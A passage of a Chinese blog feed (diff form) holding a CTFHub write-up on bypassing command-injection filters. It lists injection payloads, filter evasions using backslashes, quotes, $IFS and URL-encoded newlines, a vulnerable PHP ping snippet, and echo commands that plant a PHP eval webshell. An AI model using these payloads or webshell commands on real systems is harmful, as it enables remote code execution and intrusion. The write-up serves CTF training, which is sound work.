 <h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>类似exec(),system()</p>
+<h2 id="几种bypass"><a href="#几种bypass" class="headerlink" title="几种bypass"></a>几种bypass</h2><h3 id="基本的注入"><a href="#基本的注入" class="headerlink" title="基本的注入"></a>基本的注入</h3><ul>
+<li><pre><code>127.0.0.1;ls
+127.0.0.1;cat xxx.txt
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+127.0.0.1;echo &quot;&lt;?php @eval(\$_POST[&apos;key&apos;]);?&gt;&quot; &gt;xxx.php
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  \$用来转义，有时echo会用到-e参数</span><br><span class="line"></span><br><span class="line">  [有关-e、-n参数。](https:&#x2F;&#x2F;www.cnblogs.com&#x2F;karl-python&#x2F;p&#x2F;9261920.html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### base64编码</span><br><span class="line"></span><br><span class="line">有时有些内容无法回显,我们可以base64编码它们</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+1;cat xxx.txt &amp; base64
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  &amp;的作用是把前面输出的结果作为输入进行后面的操作</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+1;base64 xxx.txt
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤cat</span><br><span class="line"></span><br><span class="line">- 反斜杠 ： 例如</span><br></pre></td></tr></table></figure>
+ca\t fl\ag.php
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 连接符： 例如</span><br></pre></td></tr></table></figure>
+ca&apos;&apos;t fla&apos;&apos;g.txt
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤空格</span><br><span class="line"></span><br><span class="line">在 bash 下, 可以用以下字符代替空格：</span><br></pre></td></tr></table></figure>
+&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, ${IFS},$IFS 等
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤目录分隔符[&#x2F;]</span><br><span class="line"></span><br><span class="line">可以使用cd命令直接进入那个目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 一个综合过滤练习</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res &#x3D; FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;</span><br><span class="line">    $ip &#x3D; $_GET[&#39;ip&#39;];</span><br><span class="line">    $m &#x3D; [];</span><br><span class="line">    if (!preg_match_all(&quot;&#x2F;(\||&amp;|;| |\&#x2F;|cat|flag|ctfhub)&#x2F;&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res &#x3D; $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</code></pre></li>
+</ul>
+<p>我们可以看到,过滤掉了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|   &amp;   ;   &#x2F;   cat   flag   ctfhub</span><br></pre></td></tr></table></figure>
+
+<p>好像大部分有用的都被过滤掉了,这时我们就需要换一种思路,我们使用url编码来解决[<strong>接下来所有的payload都是在hackbar上输入,直接在ping里输入没有用</strong>]</p>
+<h4 id="url编码表"><a href="#url编码表" class="headerlink" title="url编码表"></a>url编码表</h4><p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt="1">)<img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.png" alt="2"></p>
+<p>其中本题用到的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a   换行[输入下一条命令,类似于;]</span><br><span class="line">%09   TAB[占位符,替代那些不确定字符的位置]</span><br><span class="line">%3b   ;</span><br><span class="line">%5c   \[cat被过滤了,要加\干扰]</span><br></pre></td></tr></table></figure>
+
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0als#</span><br></pre></td></tr></table></figure>
+
+<p>得到:</p>
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.png" alt="3"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0als%09*_is_here#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.png" alt="4"></p>
+<blockquote>
+<p>其中%09*的意思:</p>
+<p>%09作为占位符,去正则匹配被过滤的flag, *代表一个或多个字符[flag就是四个字符]</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0acd%09*_is_here%0aca%5ct%09*_5861249545945.php#</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0acd%09*_is_here%0abase64%09*_5861249545945.php#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.png" alt="5"></p>
+<p>或者…</p>
+<p>这我是这么想的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;1%0aecho&quot;&lt;?php@eval(\$_POST[&#39;ag&#39;])%3b?&gt;&quot;&gt;123.php#</span><br></pre></td></tr></table></figure>
+
+<p>但是好像并不成功,直接无法写入,然后我尝试者写一些普通文本到123.php或122.txt,写入倒是都可以成功写入,问题就是这些文件打不开???base64编码也没有反应,很迷,但我有招一日一定要注入进去!加油!</p>
+<p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">RCE的综合过滤练习</a></p>
 ]]></content>
       <categories>
         <category>web安全漏洞</category>
       </categories>
+      <tags>
+        <tag>ctfhub</tag>
+      </tags>
   </entry>
   <entry>
     <title>在kali-linux下搭建DVWA</title>
